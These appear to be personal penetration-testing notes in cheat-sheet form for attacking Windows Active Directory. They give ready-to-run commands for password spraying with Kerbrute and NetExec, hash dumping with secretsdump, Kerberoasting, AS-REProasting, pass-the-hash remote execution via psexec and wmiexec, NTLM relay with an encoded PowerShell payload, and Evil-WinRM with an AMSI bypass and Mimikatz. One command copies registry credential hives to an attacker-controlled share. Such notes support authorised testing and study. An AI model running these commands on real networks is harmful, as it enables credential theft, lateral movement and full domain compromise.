### Kerbrute
Password spraying:
`.\kerbrute_linux_arm64 passwordspray -d $domain.com $usersFile "$password"`
- requires kerbrute to be installed - not on kali by default. See [PopMyKali](https://github.com/cagrigsby/PopMyKali/blob/main/jumpstart.sh) repo. 

### Impacket
```
impacket-smbclient [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

impacket-lookupsid [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

impacket-services [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

impacket-secretsdump [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
impacket-secretsdump -sam '/path/to/SAM' -system '/path/to/SYSTEM' LOCAL


impacket-GetUserSPNs [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

impacket-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #AS-REProasting, need to provide usernames list

##RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
```
You can save SAM, SYSTEM, and SECURITY all at once with:
`impacket-reg $domain/$user:$password@$target backup -o '\\ATTACKER_IP\someshare'`
- must start `impacket-smbserver` first

#### NTLM Relay
`sudo impacket-ntlmrelayx --no-http-server -smb2support -t $targetIP -c "powershell -enc JABjAGwAaQ..."
- We receive an authentication request on our machine and essentially re-route it to a different machine (`$targetIP`) so that's it's executed there. 

#### mssqlclient
`impacket-mssqlclient $user:$pass@$target -windows-auth`
- This is for accessing the db, not code execution (unless you enable xp_cmdshell)

#### psexec 

#### wmiexec
- `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$target (can be 0/24)
	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 

### Evil WinRM
```
##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```


### NXC
Help
`nxc smb --help` for SMB

Can add `| grep +` to only return positive results

Can add `--users`, `--shares`, `--loggedon-users`, `--groups`, `-M spider_plus --share $share`

Password spraying:
- `nxe smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success`
	- `-u` for either $user or $userfile, same with `-p`. 
	- can also do `0/24` for the whole domain
	- `--pass-pol` to get the password policy

Pass the hash
`nxe smb $IP -u $user -H $NTLMHash --local-auth`
- can append `--sam` at the end if we get a `Pwn3d!`
- or `--lsa` 
- or `--shares`

Modules 
`nxe smb $IP -u $user -H $NTLMHash --local-auth -M $module`
- such as `lsassy`


